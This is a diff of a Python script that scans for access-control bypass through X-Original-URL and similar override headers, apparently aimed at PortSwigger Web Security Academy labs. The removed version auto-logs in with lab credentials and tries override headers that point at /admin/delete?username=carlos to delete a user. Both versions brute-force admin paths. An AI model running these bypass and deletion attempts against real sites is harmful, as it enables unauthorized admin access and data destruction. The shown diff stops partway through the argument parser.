@@ -1,550 +1,410 @@
 #!/usr/bin/env python3
 """
-x_override_full_exploit.py
+xoverride_single.py
 
-Full scanner + optional automatic exploit for PortSwigger-like labs.
-- SecLists-based optimized brute forcing (Discovery/Web-Content)
-- Header override testing (X-Original-URL, X-Rewrite-URL, ...)
-- GET/POST support and optional automatic login (wiener/peter) for labs
-- --auto-exploit will attempt to trigger /admin/delete?username=carlos (GET/POST forms)
-- Output: JSON/CSV, colored terminal
+Single-file modular X-Override scanner (class-based), optimized for low false-positives.
+Usage:
+  python3 xoverride_single.py -u example.com [--deep] [--post-data "u=p&p=q"] [--cookie "session=..."] [--max 500] [--insecure]
 
-Usage example:
-  python3 x_override_full_exploit.py -u 0a90006204c026ba804abc79007b00c4.web-security-academy.net --deep --follow --concurrency 8 --auto-exploit --output findings.json
+Note: Use only on authorized targets (labs / your infrastructure).
 """
-
 import argparse
-import asyncio
-import aiohttp
-import ssl
-import certifi
-from aiohttp import ClientConnectorError, ClientResponseError, ClientSSLError, ClientOSError, ClientTimeout
-from urllib.parse import urljoin, urlparse
-from pathlib import Path
+import requests
 import os
-import json
-import csv
-import hashlib
-import time
 import re
 import sys
+import hashlib
+import json
+from urllib.parse import urljoin, urlparse
+from difflib import SequenceMatcher
+from collections import defaultdict
+from pathlib import Path
+import time
 
-# ---------------- Config ----------------
-SECLISTS_BASE_CANDIDATES = [
-    "/usr/share/seclists",
-    "/usr/share/wordlists/seclists",
-    "/opt/seclists",
-    "/root/SecLists",
-    str(Path.home() / "SecLists"),
-]
-
-SECLISTS_DISCOVERY_DIR = "Discovery/Web-Content"
-
-# Relative lists to consider (we will scan entire Discovery/Web-Content and filter)
-ADMIN_KEYWORDS = ["admin","panel","dashboard","manage","root","secure","private","console","login","administrator","adminer"]
-
+# ------------------ Config ------------------
+SECLISTS_DIR_DEFAULT = "/usr/share/seclists/Discovery/Web-Content"
 HEADER_VARIANTS = [
     "X-Original-URL","X-Original-Url","X-Original-URI","X-Original-Uri",
     "X-Rewrite-URL","X-Rewrite-Url","X-Override-URL",
     "X-Forwarded-Host","X-Forwarded-For","X-Forwarded-Proto",
     "X-HTTP-Method-Override","X-Requested-With"
 ]
-
+ADMIN_KEYWORDS = ["admin","administrator","panel","dashboard","manage","delete","settings","login","user","users","csrf","token"]
+DEFAULT_BASELINE_PATHS = ["/", "/index", "/home", "/login"]
 DEFAULT_OVERRIDE_TARGETS = ["/admin","/admin/delete","/admin/delete?username=test"]
 
-SNIPPET_LEN = 300
+# thresholds
+SIMILARITY_THRESHOLD = 0.85   # if candidate similar to baseline > this -> likely same page
+ADMIN_KEYWORD_COUNT_THRESHOLD = 2  # number of admin keywords required to consider admin page
+LEN_DIFF_MIN = 50  # minimal body length diff to consider significant
 
-# Terminal colors
-GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"; CYAN = "\033[96m"; RESET = "\033[0m"
-
-# ---------------- Helpers ----------------
-
-def find_seclists_root():
-    for p in SECLISTS_BASE_CANDIDATES:
-        if os.path.isdir(p):
-            # prefer candidate that actually contains Discovery/Web-Content
-            if os.path.isdir(os.path.join(p, SECLISTS_DISCOVERY_DIR)):
-                return os.path.join(p, SECLISTS_DISCOVERY_DIR)
-            return p
-    return None
-
+# ------------------ Utilities ------------------
 def normalize_path(p):
-    if not p:
-        return None
+    if not p: return None
     p = p.strip()
-    if p == "" or p.startswith("#"):
-        return None
-    # remove URL scheme/host if present
     if "://" in p:
         try:
-            parsed = urlparse(p)
-            p = parsed.path or "/"
-            if parsed.query:
-                p += "?" + parsed.query
+            p = urlparse(p).path or "/"
         except:
             pass
-    # replace backslashes, collapse multiple slashes
     p = p.replace("\\","/")
     p = re.sub(r"/+", "/", p)
-    if not p.startswith("/"):
-        p = "/" + p
-    # remove trailing slash except root
-    if p != "/" and p.endswith("/"):
-        p = p.rstrip("/")
+    if not p.startswith("/"): p = "/" + p
+    if p != "/" and p.endswith("/"): p = p.rstrip("/")
     return p
 
-def snippet(text, n=SNIPPET_LEN):
-    if not text:
+def extract_title(html):
+    if not html:
         return ""
-    s = text.replace("\r"," ").replace("\n"," ")
-    return s[:n]
+    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
+    if m:
+        return m.group(1).strip()
+    return ""
 
-def sha256_text(text):
-    if not text:
-        return ""
+def sha256(text):
+    if text is None: return ""
     return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()
 
-# ---------------- Load SecLists (optimized filter) ----------------
-def load_admin_paths_from_seclists(discovery_dir, optimize_filter=True):
-    paths = []
-    if not discovery_dir or not os.path.isdir(discovery_dir):
-        return paths
-    # read all files in directory
-    for root, dirs, files in os.walk(discovery_dir):
-        for fname in files:
-            full = os.path.join(root, fname)
-            try:
-                with open(full, "r", errors="ignore") as fh:
-                    for line in fh:
-                        line = line.strip()
-                        if not line or line.startswith("#"):
-                            continue
-                        # if optimize_filter, only keep lines containing admin keywords
-                        low = line.lower()
-                        if optimize_filter:
-                            if not any(k in low for k in ADMIN_KEYWORDS):
-                                continue
-                        n = normalize_path(line)
-                        if n:
-                            paths.append(n)
-            except Exception:
-                continue
-    # deduplicate preserving order
-    seen = set()
-    out = []
-    for p in paths:
-        if p not in seen:
-            seen.add(p)
-            out.append(p)
-    return out
+def similarity(a, b):
+    return SequenceMatcher(None, a, b).ratio()
 
-# ---------------- Async HTTP utilities ----------------
-async def fetch(session, method, url, headers=None, data=None, allow_redirects=False):
-    try:
-        async with session.request(method, url, headers=headers, data=data, allow_redirects=allow_redirects) as resp:
-            text = await resp.text(errors="ignore")
-            return {
-                "status": resp.status,
-                "headers": dict(resp.headers),
-                "text": text,
-                "len": len(text.encode("utf-8", errors="ignore")),
-                "url": str(resp.url)
-            }
-    except (ClientConnectorError, ClientResponseError, ClientSSLError, ClientOSError) as e:
-        return {"status": None, "headers": {}, "text": f"ERROR: {e}", "len": 0, "url": url}
-    except asyncio.TimeoutError:
-        return {"status": None, "headers": {}, "text": "ERROR: TIMEOUT", "len": 0, "url": url}
-    except Exception as e:
-        return {"status": None, "headers": {}, "text": f"ERROR: {e}", "len": 0, "url": url}
+def short_snippet(text, n=200):
+    if not text: return ""
+    return re.sub(r"\s+", " ", text)[:n]
 
-async def follow_chain(session, method, url, headers=None, data=None, max_hops=6, rate_limit=0.0):
-    chain = []
-    cur = url
-    for i in range(max_hops):
-        r = await fetch(session, method, cur, headers=headers, data=data, allow_redirects=False)
-        chain.append(r)
-        status = r.get("status")
-        if not status or status < 300 or status >= 400:
-            break
-        loc = r.get("headers", {}).get("Location")
-        if not loc:
-            break
-        cur = urljoin(cur, loc)
-        if rate_limit:
-            await asyncio.sleep(rate_limit)
-    return chain
+# ------------------ Classes ------------------
 
-def chain_summary(chain):
-    if not chain:
-        return ""
-    return " -> ".join([f"{c.get('status')}:{urlparse(c.get('url')).path or '/'}" for c in chain])
-
-def is_interesting(baseline, candidate, baseline_chain=None, cand_chain=None, threshold=0.10):
-    reasons = []
-    severity = "LOW"
-    if candidate is None or candidate.get("status") is None:
-        return False, reasons, severity
-
-    if baseline is None or baseline.get("status") is None:
-        reasons.append("no baseline but candidate responded")
-        severity = "MEDIUM"
-        return True, reasons, severity
-
-    b = baseline.get("status"); c = candidate.get("status")
-    if b != c:
-        reasons.append(f"status changed {b} -> {c}")
-        if b in (401,403,404) and c in (200,301,302):
-            severity = "HIGH"
-        else:
-            severity = max_severity(severity, "MEDIUM")
-
-    b_loc = baseline.get("headers", {}).get("Location")
-    c_loc = candidate.get("headers", {}).get("Location")
-    if b_loc != c_loc:
-        reasons.append(f"Location changed: {b_loc} -> {c_loc}")
-        severity = max_severity(severity, "HIGH")
-
-    b_len = baseline.get("len", 0)
-    c_len = candidate.get("len", 0)
-    if b_len == 0 and c_len > 50:
-        reasons.append(f"body len was 0 now {c_len}")
-        severity = max_severity(severity, "MEDIUM")
-    elif b_len > 0:
-        diff = abs(b_len - c_len) / b_len
-        if diff > threshold:
-            reasons.append(f"body length changed by {diff:.2%} ({b_len}->{c_len})")
-            severity = max_severity(severity, "MEDIUM")
-
-    lower_text = (candidate.get("text","") or "").lower()
-    if any(k in lower_text for k in ADMIN_KEYWORDS):
-        reasons.append("admin keywords found in response")
-        severity = max_severity(severity, "HIGH")
-
-    if baseline_chain and cand_chain:
-        if chain_summary(baseline_chain) != chain_summary(cand_chain):
-            reasons.append(f"redirect chain differs")
-            severity = max_severity(severity, "MEDIUM")
-
-    if baseline and baseline.get("status") == 403 and candidate.get("status") in (200,301,302):
-        reasons.append("baseline 403 but candidate returned success (403 special)")
-        severity = "HIGH"
-
-    return (len(reasons) > 0), reasons, severity
-
-def max_severity(cur, new):
-    order = {"LOW":0,"MEDIUM":1,"HIGH":2}
-    return cur if order[cur] >= order[new] else new
-
-# ---------------- Scanner Class ----------------
-class XOverrideScanner:
-    def __init__(self, base, concurrency=10, timeout=8, insecure=False, follow=False, deep=False,
-                 post_data=None, cookie=None, rate_limit=0.0, output=None, csv=None, auto_exploit=False, auto_login=False):
-        self.base = base.rstrip("/")
-        self.concurrency = concurrency
+class Requester:
+    def __init__(self, verify=True, timeout=8, proxies=None):
+        self.session = requests.Session()
+        self.session.verify = verify
+        self.session.headers.update({"User-Agent":"XOverrideSingle/1.0"})
         self.timeout = timeout
-        self.insecure = insecure
-        self.follow = follow
-        self.deep = deep
+        if proxies:
+            self.session.proxies.update(proxies)
+        # requests by default uses env proxies; trust_env True uses them
+        self.session.trust_env = True
+
+    def get(self, url, headers=None, allow_redirects=False):
+        try:
+            r = self.session.get(url, headers=headers, allow_redirects=allow_redirects, timeout=self.timeout)
+            return r
+        except requests.RequestException as e:
+            return None
+
+    def post(self, url, headers=None, data=None, allow_redirects=False):
+        try:
+            r = self.session.post(url, headers=headers, data=data, allow_redirects=allow_redirects, timeout=self.timeout)
+            return r
+        except requests.RequestException:
+            return None
+
+class SecListsLoader:
+    def __init__(self, base_dir=None, filter_keywords=None):
+        self.base_dir = base_dir or SECLISTS_DIR_DEFAULT
+        self.filter_keywords = filter_keywords or ["admin","panel","dashboard","manage","login","root","secure","private","console","adminer"]
+        self.paths = []
+
+    def discover(self, max_paths=2000):
+        out = []
+        if not os.path.isdir(self.base_dir):
+            return out
+        for root, dirs, files in os.walk(self.base_dir):
+            for fname in files:
+                full = os.path.join(root, fname)
+                try:
+                    with open(full, "r", errors="ignore") as fh:
+                        for line in fh:
+                            line=line.strip()
+                            if not line or line.startswith("#"): continue
+                            low=line.lower()
+                            if not any(k in low for k in self.filter_keywords): continue
+                            p = normalize_path(line)
+                            if p:
+                                out.append(p)
+                except Exception:
+                    continue
+        # deduplicate preserving order
+        seen=set(); clean=[]
+        for p in out:
+            if p not in seen:
+                seen.add(p)
+                clean.append(p)
+            if len(clean) >= max_paths:
+                break
+        self.paths = clean
+        return clean
+
+class Analyzer:
+    def __init__(self, baseline_map):
+        """
+        baseline_map: dict[path] = {"len":..., "hash":..., "title":..., "text":...}
+        """
+        self.baseline = baseline_map or {}
+
+    def fingerprint_match(self, candidate_text):
+        """Compare candidate against all baseline fingerprints. Return (matched_path, similarity) or (None,0)"""
+        best = (None, 0.0)
+        for p,b in self.baseline.items():
+            sim = similarity(candidate_text or "", b.get("text","") or "")
+            if sim > best[1]:
+                best = (p, sim)
+        return best
+
+    def is_admin_like(self, text):
+        if not text:
+            return False, 0, []
+        low = (text or "").lower()
+        found=[]
+        for k in ADMIN_KEYWORDS:
+            if k in low:
+                found.append(k)
+        return (len(found) >= ADMIN_KEYWORD_COUNT_THRESHOLD), len(found), found
+
+    def analyze(self, baseline_resp, candidate_resp):
+        """
+        baseline_resp and candidate_resp are requests.Response objects (or None).
+        Returns dict: {interesting:bool, reasons:[...], severity: 'LOW'|'MEDIUM'|'HIGH'}
+        """
+        reasons=[]
+        severity="LOW"
+        if candidate_resp is None:
+            return {"interesting":False, "reasons":["no candidate response"], "severity":severity}
+
+        c_status = candidate_resp.status_code
+        c_text = candidate_resp.text if candidate_resp.text else ""
+        c_len = len(candidate_resp.content) if candidate_resp.content else 0
+        c_title = extract_title(c_text)
+
+        if baseline_resp is None:
+            reasons.append("no baseline - candidate responded")
+            severity="MEDIUM"
+            # then further checks
+        else:
+            b_status = baseline_resp.status_code
+            b_text = baseline_resp.text if baseline_resp.text else ""
+            b_len = len(baseline_resp.content) if baseline_resp.content else 0
+            b_title = extract_title(b_text)
+
+            # status change
+            if b_status != c_status:
+                reasons.append(f"status changed {b_status} -> {c_status}")
+                if b_status in (401,403,404) and c_status in (200,301,302):
+                    severity="HIGH"
+                else:
+                    severity = "MEDIUM" if severity!="HIGH" else severity
+
+            # title difference
+            if b_title and c_title and b_title.strip().lower() != c_title.strip().lower():
+                reasons.append(f"title changed: '{b_title}' -> '{c_title}'")
+                severity = "MEDIUM" if severity!="HIGH" else severity
+
+            # body length difference
+            if abs(b_len - c_len) > max(LEN_DIFF_MIN, b_len//10 if b_len>0 else LEN_DIFF_MIN):
+                reasons.append(f"body length changed ({b_len} -> {c_len})")
+                severity = "MEDIUM" if severity!="HIGH" else severity
+
+        # fingerprint (similarity to baseline)
+        matched_path, sim = self.fingerprint_match(c_text)
+        if matched_path and sim >= SIMILARITY_THRESHOLD:
+            reasons.append(f"response very similar to baseline '{matched_path}' (sim={sim:.2f})")
+            # similarity to baseline implies likely same page => reduce severity
+            # if earlier high severity flagged, keep it but mark as suspicious
+            if severity != "HIGH":
+                severity = "LOW"
+        # admin-like detection
+        admin_like, count, found = self.is_admin_like(c_text)
+        if admin_like:
+            reasons.append(f"admin-like keywords found: {found}")
+            # if similarity says same as baseline then don't bump high
+            if severity=="LOW":
+                severity="HIGH"
+            elif severity=="MEDIUM":
+                severity="HIGH"
+
+        # redirect chain check
+        # requests.Response.history is a list of Response objects if allow_redirects True
+        # But we normally used allow_redirects=False; still candidate_resp might have .headers['Location']
+        if 'Location' in candidate_resp.headers:
+            reasons.append(f"Location header in candidate: {candidate_resp.headers.get('Location')}")
+            severity = "MEDIUM" if severity!="HIGH" else severity
+
+        interesting = any([
+            ("status changed" in r) or ("admin-like" in r) or ("admin-like" in r)
+            for r in reasons
+        ]) or admin_like
+
+        # Final rule: require at least two independent signals to mark HIGH:
+        # signals: status_change, title_change, admin_keywords, body_len_change, location_change, not-similar-to-baseline
+        signals = 0
+        if any("status changed" in r for r in reasons): signals += 1
+        if any(r.startswith("title changed") for r in reasons): signals += 1
+        if admin_like: signals += 1
+        if any("body length changed" in r for r in reasons): signals += 1
+        if any(r.startswith("Location header") for r in reasons) or any("Location changed" in r for r in reasons): signals += 1
+        # not similar to baseline:
+        if not (matched_path and sim >= SIMILARITY_THRESHOLD):
+            signals += 1
+
+        # determine final severity
+        if signals >= 3:
+            final_sev = "HIGH"
+        elif signals == 2:
+            final_sev = "MEDIUM"
+        else:
+            final_sev = "LOW"
+
+        # but if matched similarity to baseline strongly and no admin keywords, mark not interesting
+        if matched_path and sim >= SIMILARITY_THRESHOLD and not admin_like and final_sev!="HIGH":
+            return {"interesting": False, "reasons": ["response matches baseline closely; likely fallback"], "severity": "LOW"}
+
+        return {"interesting": True if final_sev!="LOW" else False, "reasons": reasons, "severity": final_sev}
+
+class Scanner:
+    def __init__(self, target, post_data=None, cookie=None, insecure=False, deep=False, max_paths=200, timeout=8):
+        self.raw_target = target
+        if not (target.startswith("http://") or target.startswith("https://")):
+            self.target_candidates = ["https://" + target, "http://" + target]
+        else:
+            self.target_candidates = [target]
         self.post_data = post_data
         self.cookie = cookie
-        self.rate_limit = rate_limit
-        self.output = output
-        self.csv = csv
-        self.auto_exploit = auto_exploit
-        self.auto_login = auto_login
-
-        self.override_paths = list(DEFAULT_OVERRIDE_TARGETS)
-        self.semaphore = asyncio.Semaphore(concurrency)
+        self.verify = not insecure
+        self.deep = deep
+        self.max_paths = max_paths
+        self.req = Requester(verify=self.verify, timeout=timeout)
+        self.secloader = SecListsLoader()
+        self.baseline_map = {}
+        self.analyzer = None
         self.findings = []
+        self.seen_findings = set()
+        self.override_targets = list(DEFAULT_OVERRIDE_TARGETS)
+        self.headers_to_try = HEADER_VARIANTS
 
-        self.session = None
-
-    async def __aenter__(self):
-        # ssl context
-        if self.insecure:
-            sslcontext = False
-        else:
-            ctx = ssl.create_default_context(cafile=certifi.where())
-            sslcontext = ctx
-        timeout = ClientTimeout(total=self.timeout)
-        connector = aiohttp.TCPConnector(ssl=sslcontext, limit=0)
-        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout, trust_env=True)
-        return self
-
-    async def __aexit__(self, exc_type, exc, tb):
-        if self.session:
-            await self.session.close()
-
-    async def prepare_override_paths(self):
+    def build_override_list(self):
+        # extend override targets with sec lists (if deep)
         if self.deep:
-            seclists_root = find_seclists_root()
-            if not seclists_root:
-                print(f"{RED}[!] --deep requested but SecLists not found. Disable --deep or install SecLists.{RESET}")
-                return
-            discovery = os.path.join(seclists_root, SECLISTS_DISCOVERY_DIR) if os.path.basename(seclists_root) != "Discovery" else seclists_root
-            if not os.path.isdir(discovery):
-                # if find_seclists_root already returned the full Discovery/Web-Content path, handle it
-                discovery = seclists_root if os.path.isdir(seclists_root) else discovery
-            loaded = load_admin_paths_from_seclists(discovery, optimize_filter=True)
-            # extend override paths with loaded ones
-            for p in loaded:
-                if p not in self.override_paths:
-                    self.override_paths.append(p)
-            print(f"{CYAN}[i] Loaded {len(loaded)} override candidates from SecLists (optimized).{RESET}")
+            secl = self.secloader.discover(max_paths=self.max_paths*5)
+            for p in secl:
+                if p not in self.override_targets:
+                    self.override_targets.append(p)
+        # ensure normalized and unique
+        norm=[]
+        for p in self.override_targets:
+            n = normalize_path(p)
+            if n and n not in norm:
+                norm.append(n)
+        self.override_targets = norm
 
-    async def auto_login_if_requested(self):
-        # Attempt PortSwigger lab default login if requested and post_data not provided
-        if not self.auto_login:
-            return None
-        login_path = "/login"
-        login_url = urljoin(self.base, login_path)
-        print(f"{CYAN}[i] Attempting automatic login to {login_url}{RESET}")
-        # fetch login page for CSRF token if present
-        r = await fetch(self.session, "GET", login_url, headers=({"Cookie": self.cookie} if self.cookie else None), data=None)
-        # try to parse CSRF token as common input name
-        token = None
-        if r and r.get("text"):
-            # naive regex extraction for hidden input named csrf or token
-            m = re.search(r'name=["\']?(?:csrf|token|_csrf|authenticity_token)["\']?\s+value=["\']([^"\']+)["\']', r.get("text"), re.I)
-            if m:
-                token = m.group(1)
-        # build post data - default for labs
-        pdata = None
-        if self.post_data:
-            pdata = self.post_data
-        else:
-            # use lab defaults
-            params = {"username":"wiener","password":"peter"}
-            if token:
-                # try common param names
-                params["csrf"] = token
-            # build urlencoded
-            pdata = "&".join([f"{k}={v}" for k,v in params.items()])
-        # perform login POST
-        post_resp = await fetch(self.session, "POST", login_url, headers=({"Cookie": self.cookie} if self.cookie else None), data=pdata)
-        if post_resp and post_resp.get("status") in (200,302,301):
-            print(f"{GREEN}[+] Auto-login seemed to respond with {post_resp.get('status')}{RESET}")
-            # store cookie jar from session is automatic in aiohttp client session
-            return True
-        print(f"{YELLOW}[!] Auto-login did not clearly succeed (status {post_resp.get('status') if post_resp else 'N/A'}){RESET}")
-        return False
-
-    async def analyze_baseline(self, path):
-        target = urljoin(self.base, path.lstrip("/"))
+    def prepare_baselines(self, base_url):
+        print("[*] Preparing baselines for:", base_url)
+        self.baseline_map = {}
         headers = {}
-        if self.cookie:
-            headers["Cookie"] = self.cookie
-        # GET baseline
-        base_get = await fetch(self.session, "GET", target, headers=headers, data=None, allow_redirects=False)
-        base_get_chain = []
-        if self.follow:
-            base_get_chain = await follow_chain(self.session, "GET", target, headers=headers, data=None, max_hops=6, rate_limit=self.rate_limit)
-        base_post = None
-        base_post_chain = []
-        if self.post_data:
-            base_post = await fetch(self.session, "POST", target, headers=headers, data=self.post_data, allow_redirects=False)
-            if self.follow:
-                base_post_chain = await follow_chain(self.session, "POST", target, headers=headers, data=self.post_data, max_hops=6, rate_limit=self.rate_limit)
-        return (base_get, base_get_chain, base_post, base_post_chain)
+        if self.cookie: headers["Cookie"]=self.cookie
+        for p in DEFAULT_BASELINE_PATHS:
+            url = urljoin(base_url, p.lstrip("/"))
+            r = self.req.get(url, headers=headers, allow_redirects=False)
+            if r is None:
+                continue
+            self.baseline_map[p] = {"len": len(r.content or b""), "hash": sha256(r.text or ""), "title": extract_title(r.text or ""), "text": r.text or ""}
+            print(f"  baseline {p} -> status {r.status_code} len {len(r.content or b'')}")
+        # build analyzer
+        self.analyzer = Analyzer(self.baseline_map)
 
-    async def test_override_combo(self, path, header, override, method, baseline_resp, baseline_chain):
-        # construct headers
+    def run_once(self, base_url):
+        self.build_override_list()
+        self.prepare_baselines(base_url)
         headers = {}
-        if self.cookie:
-            headers["Cookie"] = self.cookie
-        headers[header] = override
-        target = urljoin(self.base, path.lstrip("/"))
-        # use semaphore for concurrency
-        async with self.semaphore:
-            if method == "GET":
-                if self.follow:
-                    cand_chain = await follow_chain(self.session, "GET", target, headers=headers, data=None, max_hops=6, rate_limit=self.rate_limit)
-                    candidate = cand_chain[-1] if cand_chain else None
-                else:
-                    candidate = await fetch(self.session, "GET", target, headers=headers, data=None)
-                    cand_chain = []
-            else:
-                if self.follow:
-                    cand_chain = await follow_chain(self.session, "POST", target, headers=headers, data=self.post_data, max_hops=6, rate_limit=self.rate_limit)
-                    candidate = cand_chain[-1] if cand_chain else None
-                else:
-                    candidate = await fetch(self.session, "POST", target, headers=headers, data=self.post_data)
-                    cand_chain = []
-            return candidate, cand_chain
+        if self.cookie: headers["Cookie"]=self.cookie
 
-    async def run_for_path(self, path):
-        # prepare baseline
-        base_get, base_get_chain, base_post, base_post_chain = await self.analyze_baseline(path)
-        # try override combinations
-        for header in HEADER_VARIANTS:
-            for override in self.override_paths:
-                # methods to try
-                methods = [("GET", base_get, base_get_chain)]
-                if self.post_data is not None:
-                    methods.append(("POST", base_post, base_post_chain))
-                for method_name, baseline_resp, baseline_chain in methods:
-                    candidate, cand_chain = await self.test_override_combo(path, header, override, method_name, baseline_resp, baseline_chain)
-                    # logging
-                    cand_status = candidate.get("status") if candidate else None
-                    cand_len = candidate.get("len") if candidate else 0
-                    print(f"[{header}] {method_name} -> {override} => {cand_status} | len={cand_len} | url={candidate.get('url') if candidate else 'N/A'}")
-                    interesting, reasons, severity = is_interesting(baseline_resp, candidate, baseline_chain, cand_chain)
-                    if interesting:
-                        record = {
-                            "path_tested": path,
-                            "header": header,
-                            "method": method_name,
-                            "override": override,
-                            "severity": severity,
-                            "reasons": reasons,
-                            "baseline_status": baseline_resp.get("status") if baseline_resp else None,
-                            "candidate_status": candidate.get("status") if candidate else None,
-                            "candidate_len": cand_len,
-                            "candidate_url": candidate.get("url") if candidate else None,
-                            "candidate_snippet": snippet(candidate.get("text","")) if candidate else ""
-                        }
-                        self.findings.append(record)
-                        # If auto_exploit and HIGH severity, attempt exploit
-                        if self.auto_exploit and severity == "HIGH":
-                            await self.attempt_auto_exploit(record)
+        # Use user-provided post_data to enable POST tests
+        test_paths = ["/", "/login"]  # baseline paths to test overrides on
+        for path in test_paths:
+            target_url = urljoin(base_url, path.lstrip("/"))
+            print(f"\n== Testing baseline path {path} on {base_url} ==")
+            base_get = self.req.get(target_url, headers=headers, allow_redirects=False)
+            base_post = None
+            if self.post_data:
+                base_post = self.req.post(target_url, headers=headers, data=self.post_data, allow_redirects=False)
 
-    async def attempt_auto_exploit(self, finding):
-        """
-        Try to auto-trigger deletion of carlos by using known delete endpoints
-        via the found header/override combination. This tries both GET and POST.
-        Only for labs/authorized targets.
-        """
-        header = finding["header"]
-        override = finding["override"]
-        path = finding["path_tested"]
-        print(f"{YELLOW}[i] Auto-exploit: trying delete payloads for {header} -> {override}{RESET}")
-        delete_candidates = [
-            "/admin/delete?username=carlos",
-            "/admin/delete?username=test",
-            "/admin/delete?user=carlos",
-            "/admin/delete?username=carlos&confirm=1",
-            "/admin/delete",
-            "/admin/remove?username=carlos",
-            "/admin/deleteUser?username=carlos",
-            "/admin/delete?username=carlos"  # duplicate safe
-        ]
-        # try each delete endpoint as override value
-        for d in delete_candidates:
-            hdrs = {}
-            if self.cookie:
-                hdrs["Cookie"] = self.cookie
-            hdrs[header] = d
-            target = urljoin(self.base, path.lstrip("/"))
-            # Try GET
-            try:
-                rget = await fetch(self.session, "GET", target, headers=hdrs, data=None)
-                print(f"    [Exploit GET] override {d} => status {rget.get('status') if rget else 'N/A'} len={rget.get('len') if rget else 0}")
-                # Heuristic success if redirect to /admin or 200 with admin keywords or 302 to admin
-                if rget and (rget.get("status") in (200,302,301) and any(k in (rget.get("text","") or "").lower() for k in ["user deleted","deleted","success","carlos"])):
-                    print(f"{GREEN}[+] Exploit likely succeeded via GET override {d}{RESET}")
-                    return
-            except Exception:
-                pass
-            # Try POST (some endpoints expect POST)
-            try:
-                rpost = await fetch(self.session, "POST", target, headers=hdrs, data=self.post_data or "")
-                print(f"    [Exploit POST] override {d} => status {rpost.get('status') if rpost else 'N/A'} len={rpost.get('len') if rpost else 0}")
-                if rpost and (rpost.get("status") in (200,302,301) and any(k in (rpost.get("text","") or "").lower() for k in ["user deleted","deleted","success","carlos"])):
-                    print(f"{GREEN}[+] Exploit likely succeeded via POST override {d}{RESET}")
-                    return
-            except Exception:
-                pass
-        print(f"{YELLOW}[!] Auto-exploit attempts finished for this finding (no clear success signal).{RESET}")
+            # iterate override headers and override targets
+            for header in self.headers_to_try:
+                for override in self.override_targets:
+                    # skip identity
+                    override_norm = normalize_path(override)
+                    hdrs = dict(headers)
+                    hdrs[header] = override_norm
+                    # GET
+                    rget = self.req.get(target_url, headers=hdrs, allow_redirects=False)
+                    # analyze
+                    res = self.analyzer.analyze(base_get, rget)
+                    key = (header, "GET", override_norm, path)
+                    if res.get("interesting"):
+                        # dedup
+                        keyid = "|".join(map(str,key))
+                        if keyid not in self.seen_findings:
+                            self.seen_findings.add(keyid)
+                            self.findings.append({"header":header,"method":"GET","override":override_norm,"path":path,"severity":res["severity"],"reasons":res["reasons"],"candidate_len": (len(rget.content) if rget and rget.content else 0),"candidate_title": extract_title(rget.text if rget else "")})
+                    # POST
+                    if self.post_data:
+                        rpost = self.req.post(target_url, headers=hdrs, data=self.post_data, allow_redirects=False)
+                        res2 = self.analyzer.analyze(base_post, rpost)
+                        key2 = (header, "POST", override_norm, path)
+                        if res2.get("interesting"):
+                            keyid2 = "|".join(map(str,key2))
+                            if keyid2 not in self.seen_findings:
+                                self.seen_findings.add(keyid2)
+                                self.findings.append({"header":header,"method":"POST","override":override_norm,"path":path,"severity":res2["severity"],"reasons":res2["reasons"],"candidate_len": (len(rpost.content) if rpost and rpost.content else 0),"candidate_title": extract_title(rpost.text if rpost else "")})
 
-# ---------------- Runner ----------------
+    def run(self):
+        for base in self.target_candidates:
+            print(f"\n== Testing base: {base} ==")
+            # quick reachability check
+            r = self.req.get(base, headers=None, allow_redirects=False)
+            if r is None:
+                print("  [!] Base not reachable:", base)
+                continue
+            # prepare override list
+            self.build_override_list()
+            # run once per base
+            self.run_once(base)
+        # print summary
+        print("\n[+] Scan complete. Findings:", len(self.findings))
+        for f in self.findings:
+            sev_col = f["severity"]
+            print(f"[{sev_col}] {f['header']} {f['method']} -> {f['override']} on {f['path']}")
+            for r in f["reasons"]:
+                print("   -", r)
 
-async def main_async(args):
-    # normalize base
-    base = args.url
-    if not (base.startswith("http://") or base.startswith("https://")):
-        base = "https://" + base
-    # prepare scanner
-    scanner = XOverrideScanner(base=base,
-                               concurrency=args.concurrency,
-                               timeout=args.timeout,
-                               insecure=args.insecure,
-                               follow=args.follow,
-                               deep=args.deep,
-                               post_data=args.post_data,
-                               cookie=args.cookie,
-                               rate_limit=args.rate_limit,
-                               output=args.output,
-                               csv=args.csv,
-                               auto_exploit=args.auto_exploit,
-                               auto_login=args.auto_login)
-    # prepare override paths
-    await scanner.prepare_override_paths()
-    # if auto_login was requested, attempt login to obtain session cookies before testing
-    if scanner.auto_login:
-        await scanner.auto_login_if_requested()
-    # baseline paths to try
-    baseline_paths = ["/","/login","/index","/home"]
-    if args.path:
-        baseline_paths = [args.path if args.path.startswith("/") else "/"+args.path]
-    tasks = []
-    async with scanner:
-        for p in baseline_paths:
-            tasks.append(scanner.run_for_path(p))
-        # run tasks, handle rate limiting by semaphore built-in
-        await asyncio.gather(*tasks)
-    # save results
-    if scanner.output:
-        try:
-            with open(scanner.output, "w") as fh:
-                json.dump(scanner.findings, fh, indent=2)
-            print(f"{GREEN}[+] Saved JSON to {scanner.output}{RESET}")
-        except Exception as e:
-            print(f"{RED}[!] Could not save JSON: {e}{RESET}")
-    if scanner.csv:
-        try:
-            with open(scanner.csv, "w", newline="") as csvf:
-                writer = csv.writer(csvf)
-                writer.writerow(["path_tested","header","method","override","severity","reasons","baseline_status","candidate_status","candidate_len","candidate_url"])
-                for r in scanner.findings:
-                    writer.writerow([r.get(k) for k in ("path_tested","header","method","override","severity","reasons","baseline_status","candidate_status","candidate_len","candidate_url")])
-            print(f"{GREEN}[+] Saved CSV to {scanner.csv}{RESET}")
-        except Exception as e:
-            print(f"{RED}[!] Could not save CSV: {e}{RESET}")
-    return scanner.findings
-
+# ------------------ CLI ------------------
 def parse_args():
-    p = argparse.ArgumentParser(description="X-Override full scanner + SecLists optimized brute-force + optional auto-exploit (authorized targets only)")
-    p.add_argument("-u","--url", required=True, help="Target host or base URL (e.g. example.com or https://example.com)")
-    p.add_argument("--path", help="Single baseline path (e.g. /login)")
-    p.add_argument("--post-data", help="POST body to send for POST checks (enables POST path checks)")
-    p.add_argument("--cookie", help="Cookie header value to include")
-    p.add_argument("--concurrency", type=int, default=10, help="Concurrency (default 10)")
-    p.add_argument("--timeout", type=int, default=8, help="Request timeout seconds (default 8)")
